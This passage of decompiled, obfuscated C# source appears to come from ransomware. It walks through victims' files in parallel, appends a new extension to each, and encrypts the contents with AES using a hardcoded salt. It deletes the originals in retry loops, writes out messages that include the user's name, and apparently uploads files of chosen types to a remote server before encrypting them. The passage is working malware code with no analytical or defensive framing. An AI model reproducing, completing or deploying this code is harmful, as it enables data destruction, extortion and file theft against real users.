								if (iJsQqEPvGCEvi.CbPjLHJdSiaV(CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH, phsLIEBLTPR, CS_0024_003C_003E8__locals0.SEgFdxrVdmAS))
								{
									goto IL_09d7;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.UEavMcURXNKX, item);
								}
								catch (Exception)
								{
								}
							}
							else
							{
								if (iJsQqEPvGCEvi.CbPjLHJdSiaV(CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH, phsLIEBLTPR, text4, bytes4))
								{
									goto IL_09d7;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.UEavMcURXNKX, item);
								}
								catch (Exception)
								{
								}
							}
							end_IL_02ca_2:;
						}
						catch (Exception)
						{
							goto IL_09d7;
						}
					}
					continue;
					IL_09d7:
					CS_0024_003C_003E8__locals0.lJCScpebPQHSGPj.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.lJCScpebPQHSGPj, delegate(string P_0)
		{
			CS_0024_003C_003E8__locals0 = new bFSgRwkHPWbo.hktBquzXjce();
			CS_0024_003C_003E8__locals0.aHlKGcFnWxEbwtDO = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.TpoSFZXjxy = P_0;
			if (CS_0024_003C_003E8__locals0.fsyHihgcaeW.Length != 0)
			{
				string[] fsyHihgcaeW = CS_0024_003C_003E8__locals0.fsyHihgcaeW;
				int num = 0;
				while (num < fsyHihgcaeW.Length)
				{
					string value = fsyHihgcaeW[num];
					if (!CS_0024_003C_003E8__locals0.TpoSFZXjxy.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0ab8;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.TpoSFZXjxy.EndsWith(CS_0024_003C_003E8__locals0.UEavMcURXNKX))
				{
					goto IL_0ab8;
				}
			}
			catch (Exception)
			{
				goto IL_0ab8;
			}
			if (!xaJTZrMmiQRAQ.Contains(CS_0024_003C_003E8__locals0.TpoSFZXjxy))
			{
				if (jyiNxqfYATtd == bFSgRwkHPWbo._001A(107396855))
				{
					try
					{
						if (FMLjGROaOe.dwqDkSuHLzr(CS_0024_003C_003E8__locals0.TpoSFZXjxy))
						{
							FMLjGROaOe.IxCKOOJCCsUF(CS_0024_003C_003E8__locals0.TpoSFZXjxy);
						}
					}
					catch
					{
					}
				}
				xaJTZrMmiQRAQ.Add(CS_0024_003C_003E8__locals0.TpoSFZXjxy);
				if (!aFoYhEArnYRtqzv.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.TpoSFZXjxy)))
				{
					aFoYhEArnYRtqzv.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.TpoSFZXjxy));
				}
				HHXouuwktdLUSFk(CS_0024_003C_003E8__locals0.TpoSFZXjxy);
				try
				{
					new KWOuChclelrn().OwONsISXXOOpf(CS_0024_003C_003E8__locals0.TpoSFZXjxy);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.TpoSFZXjxy, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (IHUVFGfndtpl)
							{
								Console.WriteLine(bFSgRwkHPWbo._001A(107403230) + CS_0024_003C_003E8__locals0.TpoSFZXjxy + bFSgRwkHPWbo._001A(107403185) + new FileInfo(CS_0024_003C_003E8__locals0.TpoSFZXjxy).Length + bFSgRwkHPWbo._001A(107403164));
								Console.WriteLine(bFSgRwkHPWbo._001A(107403155));
							}
						}
						catch
						{
						}
						MkUJPBjeBrD(KsnoBrbTQSaN(bFSgRwkHPWbo._001A(107402506)), bFSgRwkHPWbo._001A(107387362) + CS_0024_003C_003E8__locals0.TpoSFZXjxy + bFSgRwkHPWbo._001A(107387362) + KsnoBrbTQSaN(bFSgRwkHPWbo._001A(107402513)) + bFSgRwkHPWbo._001A(107387362) + Environment.UserName + bFSgRwkHPWbo._001A(107387362) + KsnoBrbTQSaN(bFSgRwkHPWbo._001A(107402464)));
					}
				}
				catch (Exception ex2)
				{
					if (QCmKQKwvWBrFEj)
					{
						try
						{
							File.AppendAllText(hBPcxbXfrBbYZwL, bFSgRwkHPWbo._001A(107385608) + CS_0024_003C_003E8__locals0.TpoSFZXjxy + bFSgRwkHPWbo._001A(107402439) + ex2.Message + bFSgRwkHPWbo._001A(107396224));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.TpoSFZXjxy).Length != 0)
						{
							goto end_IL_031b;
						}
						goto end_IL_031b_2;
						end_IL_031b:;
					}
					catch (Exception ex4)
					{
						if (QCmKQKwvWBrFEj)
						{
							try
							{
								File.AppendAllText(hBPcxbXfrBbYZwL, bFSgRwkHPWbo._001A(107385608) + CS_0024_003C_003E8__locals0.TpoSFZXjxy + bFSgRwkHPWbo._001A(107402390) + ex4.Message + bFSgRwkHPWbo._001A(107396224));
							}
							catch (Exception)
							{
							}
						}
						WetxdZxAdgUqT++;
						goto end_IL_031b_2;
					}
					if (ZgMAQkWlMGVlQB == bFSgRwkHPWbo._001A(107396855) && new FileInfo(CS_0024_003C_003E8__locals0.TpoSFZXjxy).Length > Convert.ToInt32(phsLIEBLTPR) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.UEavMcURXNKX != bFSgRwkHPWbo._001A(107385868))
							{
								if (uDFeFGGkwluj)
								{
									CS_0024_003C_003E8__locals0.UEavMcURXNKX = cshPaWeUxvVg + CS_0024_003C_003E8__locals0.UEavMcURXNKX;
								}
								File.Move(CS_0024_003C_003E8__locals0.TpoSFZXjxy, CS_0024_003C_003E8__locals0.TpoSFZXjxy + CS_0024_003C_003E8__locals0.UEavMcURXNKX);
							}
						}
						catch (Exception ex6)
						{
							if (QCmKQKwvWBrFEj)
							{
								try
								{
									File.AppendAllText(hBPcxbXfrBbYZwL, bFSgRwkHPWbo._001A(107385608) + CS_0024_003C_003E8__locals0.TpoSFZXjxy + bFSgRwkHPWbo._001A(107402841) + ex6.Message + bFSgRwkHPWbo._001A(107396224));
								}
								catch (Exception)
								{
								}
							}
							WetxdZxAdgUqT++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.UEavMcURXNKX != bFSgRwkHPWbo._001A(107385868))
						{
							CS_0024_003C_003E8__locals0.TpoSFZXjxy += CS_0024_003C_003E8__locals0.UEavMcURXNKX;
						}
						if (XLjwIPnIAHXCZ == bFSgRwkHPWbo._001A(107396855))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in qUoKxlxkuFsMOBYn)
								{
									if (CS_0024_003C_003E8__locals0.TpoSFZXjxy.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.aHlKGcFnWxEbwtDO.UEavMcURXNKX) && ASnTkTTzzlTA == bFSgRwkHPWbo.hktBquzXjce._0004(107396861))
									{
										if (Convert.ToInt32(UqzEWVXQurQ) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.TpoSFZXjxy).Length)
										{
											try
											{
												wihATTbwYdHSl.FglfIgSlKdgC(bFSgRwkHPWbo.hktBquzXjce._0004(107388434), bFSgRwkHPWbo.hktBquzXjce._0004(107388429), bFSgRwkHPWbo.hktBquzXjce._0004(107388448), CS_0024_003C_003E8__locals0.TpoSFZXjxy);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.TpoSFZXjxy.ToLower().EndsWith(item3) && ASnTkTTzzlTA == bFSgRwkHPWbo.hktBquzXjce._0004(107397021))
									{
										try
										{
											wihATTbwYdHSl.FglfIgSlKdgC(bFSgRwkHPWbo.hktBquzXjce._0004(107388434), bFSgRwkHPWbo.hktBquzXjce._0004(107388429), bFSgRwkHPWbo.hktBquzXjce._0004(107388448), CS_0024_003C_003E8__locals0.TpoSFZXjxy);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = FctLWdSYKGLPR.NCHlcfUWfflUhH(32);
						string s = WvhZaNjlczTpSemA.ApMfxATNQTnF(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (YtsYOxvPhpYvsqia == bFSgRwkHPWbo._001A(107397015))
						{
							byte[] array = null;
							byte[] array2 = ujXrqFZLIuhev.mYXsIDdSmNYSk(CS_0024_003C_003E8__locals0.TpoSFZXjxy, Convert.ToInt32(phsLIEBLTPR) * 1024 * 1024);
							if (!ujXrqFZLIuhev.qervcdxCETqmk(hgtQklihbol: (!LZWNsbTTjOGKx) ? (OmLPyoScyL ? ujXrqFZLIuhev.jsetmJbXIvBqD(array2, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ujXrqFZLIuhev.jsetmJbXIvBqD(array2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.SEgFdxrVdmAS), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (OmLPyoScyL ? SORyNXckDwab.kxKjqVUBRvIzUxx(array2, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : SORyNXckDwab.kxKjqVUBRvIzUxx(array2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.SEgFdxrVdmAS), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), JZMrFIOjlmFGmC: CS_0024_003C_003E8__locals0.TpoSFZXjxy, LtdxxvPkxj: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.TpoSFZXjxy + CS_0024_003C_003E8__locals0.UEavMcURXNKX, CS_0024_003C_003E8__locals0.TpoSFZXjxy);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!OmLPyoScyL)
						{
							if (!iJsQqEPvGCEvi.CbPjLHJdSiaV(CS_0024_003C_003E8__locals0.TpoSFZXjxy, phsLIEBLTPR, CS_0024_003C_003E8__locals0.SEgFdxrVdmAS))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.TpoSFZXjxy + CS_0024_003C_003E8__locals0.UEavMcURXNKX, CS_0024_003C_003E8__locals0.TpoSFZXjxy);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!iJsQqEPvGCEvi.CbPjLHJdSiaV(CS_0024_003C_003E8__locals0.TpoSFZXjxy, phsLIEBLTPR, text, bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.TpoSFZXjxy + CS_0024_003C_003E8__locals0.UEavMcURXNKX, CS_0024_003C_003E8__locals0.TpoSFZXjxy);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (uDFeFGGkwluj)
						{
							CS_0024_003C_003E8__locals0.UEavMcURXNKX = cshPaWeUxvVg + CS_0024_003C_003E8__locals0.UEavMcURXNKX;
						}
						string text2 = FctLWdSYKGLPR.NCHlcfUWfflUhH(32);
						string s2 = WvhZaNjlczTpSemA.ApMfxATNQTnF(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.UEavMcURXNKX != bFSgRwkHPWbo._001A(107385868))
						{
							if (!heKpdwyJrkK)
							{
								if (!OmLPyoScyL)
								{
									onQMKOyLMArp(CS_0024_003C_003E8__locals0.TpoSFZXjxy, CS_0024_003C_003E8__locals0.TpoSFZXjxy + CS_0024_003C_003E8__locals0.UEavMcURXNKX, JgtXDzoKBYSkMTJ);
								}
								else
								{
									onQMKOyLMArp(CS_0024_003C_003E8__locals0.TpoSFZXjxy, CS_0024_003C_003E8__locals0.TpoSFZXjxy + CS_0024_003C_003E8__locals0.UEavMcURXNKX, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!OmLPyoScyL)
									{
										sZrgcGPnICGjr(CS_0024_003C_003E8__locals0.TpoSFZXjxy, CS_0024_003C_003E8__locals0.TpoSFZXjxy + CS_0024_003C_003E8__locals0.UEavMcURXNKX, JgtXDzoKBYSkMTJ);
									}
									else
									{
										sZrgcGPnICGjr(CS_0024_003C_003E8__locals0.TpoSFZXjxy, CS_0024_003C_003E8__locals0.TpoSFZXjxy + CS_0024_003C_003E8__locals0.UEavMcURXNKX, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex11)
								{
									if (QCmKQKwvWBrFEj)
									{
										try
										{
											File.AppendAllText(hBPcxbXfrBbYZwL, bFSgRwkHPWbo._001A(107385608) + CS_0024_003C_003E8__locals0.TpoSFZXjxy + bFSgRwkHPWbo._001A(107385886) + ex11.Message + bFSgRwkHPWbo._001A(107396224));
										}
										catch (Exception)
										{
										}
									}
									WetxdZxAdgUqT++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.TpoSFZXjxy + CS_0024_003C_003E8__locals0.UEavMcURXNKX, CS_0024_003C_003E8__locals0.TpoSFZXjxy);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!heKpdwyJrkK)
						{
							if (!OmLPyoScyL)
							{
								onQMKOyLMArp(CS_0024_003C_003E8__locals0.TpoSFZXjxy, CS_0024_003C_003E8__locals0.TpoSFZXjxy + bFSgRwkHPWbo._001A(107385863), JgtXDzoKBYSkMTJ);
							}
							else
							{
								onQMKOyLMArp(CS_0024_003C_003E8__locals0.TpoSFZXjxy, CS_0024_003C_003E8__locals0.TpoSFZXjxy + bFSgRwkHPWbo._001A(107385863), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!OmLPyoScyL)
								{
									sZrgcGPnICGjr(CS_0024_003C_003E8__locals0.TpoSFZXjxy, CS_0024_003C_003E8__locals0.TpoSFZXjxy, JgtXDzoKBYSkMTJ);
								}
								else
								{
									sZrgcGPnICGjr(CS_0024_003C_003E8__locals0.TpoSFZXjxy, CS_0024_003C_003E8__locals0.TpoSFZXjxy, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex14)
							{
								if (QCmKQKwvWBrFEj)
								{
									try
									{
										File.AppendAllText(hBPcxbXfrBbYZwL, bFSgRwkHPWbo._001A(107385608) + CS_0024_003C_003E8__locals0.TpoSFZXjxy + bFSgRwkHPWbo._001A(107385886) + ex14.Message + bFSgRwkHPWbo._001A(107396224));
									}
									catch (Exception)
									{
									}
								}
								WetxdZxAdgUqT++;
								return;
							}
						}
						if (OmLPyoScyL)
						{
							if (CS_0024_003C_003E8__locals0.UEavMcURXNKX != bFSgRwkHPWbo._001A(107385868))
							{
								NdxUyyyATtE(CS_0024_003C_003E8__locals0.TpoSFZXjxy + CS_0024_003C_003E8__locals0.UEavMcURXNKX, bytes2);
							}
							else
							{
								NdxUyyyATtE(CS_0024_003C_003E8__locals0.TpoSFZXjxy, bytes2);
							}
						}
					}
					end_IL_031b_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0ab8;
			IL_0ab8:
			CS_0024_003C_003E8__locals0.lJCScpebPQHSGPj.Remove(CS_0024_003C_003E8__locals0.TpoSFZXjxy);
		});
	}

	private static void FWDWdunmLLq(string P_0, string P_1, byte[] P_2)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(P_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(P_2, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(P_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (P_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(P_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (XLjwIPnIAHXCZ == _0016(107396837))
					{
						foreach (string item in qUoKxlxkuFsMOBYn)
						{
							if (P_0.ToLower().EndsWith(item) && ASnTkTTzzlTA == _0016(107396837))
							{
								if (Convert.ToInt32(UqzEWVXQurQ) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										wihATTbwYdHSl.FglfIgSlKdgC(_0016(107388410), _0016(107388405), _0016(107388424), P_0);
									}
									catch
									{
									}
								}
							}
							else if (P_0.ToLower().EndsWith(item) && ASnTkTTzzlTA == _0016(107396997))
							{
								try
								{
									wihATTbwYdHSl.FglfIgSlKdgC(_0016(107388410), _0016(107388405), _0016(107388424), P_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(P_0) && num2 >= 0)
							{
								File.Delete(P_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (P_1.EndsWith(_0016(107385845)))
					{
						File.Move(P_1, P_1.Replace(_0016(107385845), _0016(107388361)));
					}
					return;
				}
				try
				{
					File.Delete(P_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void sZrgcGPnICGjr(string P_0, string P_1, byte[] P_2)
	{
		try
		{
			if (XLjwIPnIAHXCZ == _0016(107396837))
			{
				FileStream fileStream = new FileStream(P_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in qUoKxlxkuFsMOBYn)
				{
					if (P_0.ToLower().EndsWith(item) && ASnTkTTzzlTA == _0016(107396837))
					{
						if (Convert.ToInt32(UqzEWVXQurQ) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								wihATTbwYdHSl.FglfIgSlKdgC(_0016(107388410), _0016(107388405), _0016(107388424), P_0);
							}
							catch
							{
							}
						}
					}
					else if (P_0.ToLower().EndsWith(item) && ASnTkTTzzlTA == _0016(107396997))
					{
						try
						{
							wihATTbwYdHSl.FglfIgSlKdgC(_0016(107388410), _0016(107388405), _0016(107388424), P_0);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (P_0 != P_1)
		{
			File.Move(P_0, P_1);
			P_0 = P_1;
		}
		byte[] bytes = SORyNXckDwab.kxKjqVUBRvIzUxx(File.ReadAllBytes(P_0), P_2, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(P_0, bytes);
		JSBuxhHRYzkt++;
	}

	private static void onQMKOyLMArp(string P_0, string P_1, byte[] P_2)
	{
		VtnthPHwsfAntP CS_0024_003C_003E8__locals0 = new VtnthPHwsfAntP();
		CS_0024_003C_003E8__locals0.iUtYNLjucmwZT = P_0;
		CS_0024_003C_003E8__locals0.YQALLUKldoi = P_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string yQALLUKldoi = CS_0024_003C_003E8__locals0.YQALLUKldoi;
			FileStream fileStream = new FileStream(yQALLUKldoi, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(P_2, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (TMMTTmWVJnveZ == _0016(107396837))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.iUtYNLjucmwZT, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.iUtYNLjucmwZT, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.iUtYNLjucmwZT, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.YQALLUKldoi.Length > 0)
				{
					if (XLjwIPnIAHXCZ == _0016(107396837))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.iUtYNLjucmwZT, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in qUoKxlxkuFsMOBYn)
						{
							if (CS_0024_003C_003E8__locals0.iUtYNLjucmwZT.ToLower().EndsWith(item) && ASnTkTTzzlTA == _0016(107396837))
							{
								if (Convert.ToInt32(UqzEWVXQurQ) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										wihATTbwYdHSl.FglfIgSlKdgC(_0016(107388410), _0016(107388405), _0016(107388424), CS_0024_003C_003E8__locals0.iUtYNLjucmwZT);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.iUtYNLjucmwZT.ToLower().EndsWith(item) && ASnTkTTzzlTA == _0016(107396997))
							{
								try
								{
									wihATTbwYdHSl.FglfIgSlKdgC(_0016(107388410), _0016(107388405), _0016(107388424), CS_0024_003C_003E8__locals0.iUtYNLjucmwZT);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.iUtYNLjucmwZT);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.YQALLUKldoi.EndsWith(_0016(107385845)))
					{
						File.Move(CS_0024_003C_003E8__locals0.YQALLUKldoi, CS_0024_003C_003E8__locals0.YQALLUKldoi.Replace(_0016(107385845), _0016(107388361)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.YQALLUKldoi))
							{
								File.Delete(CS_0024_003C_003E8__locals0.YQALLUKldoi);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (QCmKQKwvWBrFEj)
			{
				try
				{
					File.AppendAllText(hBPcxbXfrBbYZwL, _0016(107385590) + CS_0024_003C_003E8__locals0.iUtYNLjucmwZT + _0016(107385868) + ex2.Message + _0016(107396206));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__8()
	{
		List<string> xYTVFNmWPjt = XYTVFNmWPjt;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string P_0)
			{
				MkUJPBjeBrD(KsnoBrbTQSaN(_0016(107385783)), P_0);
			};
		}
		Parallel.ForEach(xYTVFNmWPjt, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		List<string> source = cYRnUVUQWZjBbG;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string P_0)
			{
				MkUJPBjeBrD(KsnoBrbTQSaN(_0016(107385802)), P_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		if (HXGAbpusxAtHwkm == _0016(107396837))
		{
			string[] jRIWDxjKnYP = JRIWDxjKnYP;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string P_0)
				{
					MkUJPBjeBrD(KsnoBrbTQSaN(_0016(107385802)), _0016(107385745) + P_0 + _0016(107385768));
				};
			}
			Parallel.ForEach(jRIWDxjKnYP, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		}
		if (!qgGdJmyvbjfjKJGn().Contains(_0016(107385456)))
		{
			pBYecYRZtlUM(MaECdwVpsczmu);
		}
		else
		{
			List<string> dYUDOtUaolJR = DYUDOtUaolJR;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string P_0)
				{
					MkUJPBjeBrD(KsnoBrbTQSaN(XoauCcwIXoBdG(_0016(107385763))), P_0);
				};
			}
			Parallel.ForEach(dYUDOtUaolJR, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
		}
		List<string> source2 = crllYeSsbsC;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string P_0)
			{
				MkUJPBjeBrD(KsnoBrbTQSaN(_0016(107385738)), P_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
	}

	private static void _003CMain_003Eb__9(string P_0)
	{
		MkUJPBjeBrD(KsnoBrbTQSaN(_0016(107385783)), P_0);
	}

	private static void _003CMain_003Eb__a(string P_0)
	{
		MkUJPBjeBrD(KsnoBrbTQSaN(_0016(107385802)), P_0);
	}

	private static void _003CMain_003Eb__b(string P_0)
	{
		MkUJPBjeBrD(KsnoBrbTQSaN(_0016(107385802)), _0016(107385745) + P_0 + _0016(107385768));
	}

	private static void _003CMain_003Eb__c(string P_0)
	{
		MkUJPBjeBrD(KsnoBrbTQSaN(XoauCcwIXoBdG(_0016(107385763))), P_0);
	}

	private static void _003CMain_003Eb__d(string P_0)
	{
		MkUJPBjeBrD(KsnoBrbTQSaN(_0016(107385738)), P_0);
	}

	static OPwDdsoVlNU()
	{
		Strings.CreateGetStringDelegate(typeof(OPwDdsoVlNU));
		vRdITQqTvax = _0016(107387748);
		JgtXDzoKBYSkMTJ = null;
		ZfmtEkVSEoLZCTN = _0016(107396997);
		BKTddpEXUb = _0016(107385177);
		dSQQLmBsItoVm = new List<string>();
		qNQrNVjGAFSGb = new List<string>();
		ClUYmrEOMeRE = _0016(107396997);
		SEgFdxrVdmAS = _0016(107388361);
		HxoFecoXKSIx = _0016(107388361);
		kehqXSWYmvO = _0016(107396997);
		TLqHZRbWxRD = 0;
		jyiNxqfYATtd = _0016(107396997);
		NetkxOoqORdjco = _0016(107396997);
		LqATWbeXtbBHAAfd = _0016(107396997);
		tpBnNLFxKkRvj = _0016(107385196);
		mOrmkgrogTmQzVS = _0016(107396997);
		kvGhhsDoDxIjo = _0016(107396997);
		nZdynMPuOfLU = _0016(107396997);
		kBlJeUxHUUqobgl = _0016(107396997);
		EOjkFDoZgom = new List<string>
		{
			KsnoBrbTQSaN(_0016(107385191)),
			KsnoBrbTQSaN(_0016(107385142)),
			KsnoBrbTQSaN(_0016(107385149)),
			KsnoBrbTQSaN(_0016(107385132)),
			KsnoBrbTQSaN(_0016(107385075)),
			KsnoBrbTQSaN(_0016(107385050)),
			KsnoBrbTQSaN(_0016(107385065)),
			KsnoBrbTQSaN(_0016(107385008)),
			KsnoBrbTQSaN(_0016(107384983)),
			KsnoBrbTQSaN(_0016(107384990)),
			KsnoBrbTQSaN(_0016(107384941)),
			KsnoBrbTQSaN(_0016(107385428)),
			KsnoBrbTQSaN(_0016(107385403))
		};
		aFoYhEArnYRtqzv = new List<string>();
		GfhAxfMvRNVoVF = _0016(107396997);
		jnnEfVuAKzxGQ = _0016(107396837);
		zEHRRjZSnCPR = _0016(107396997);
		xaJTZrMmiQRAQ = new List<string>();
		YaJjvEGjPYXsk = _0016(107396997);
		ZiqYDgfFaxGQ = _0016(107385410);
		CWdRZmKsDhxK = _0016(107396837);
		wVHzQSJwQsGw = _0016(107396997);
		esUMHAcHobte = new List<string>
		{
			KsnoBrbTQSaN(_0016(107385329)),
			KsnoBrbTQSaN(_0016(107385296)),
			KsnoBrbTQSaN(_0016(107385263)),
			KsnoBrbTQSaN(_0016(107385230)),
			KsnoBrbTQSaN(_0016(107385197)),
			KsnoBrbTQSaN(_0016(107384656)),
			KsnoBrbTQSaN(_0016(107384599)),
			KsnoBrbTQSaN(_0016(107384570)),
			KsnoBrbTQSaN(_0016(107384525)),
			KsnoBrbTQSaN(_0016(107384492)),
			KsnoBrbTQSaN(_0016(107384459)),
			KsnoBrbTQSaN(_0016(107384938)),
			KsnoBrbTQSaN(_0016(107384905)),
			KsnoBrbTQSaN(_0016(107384876)),
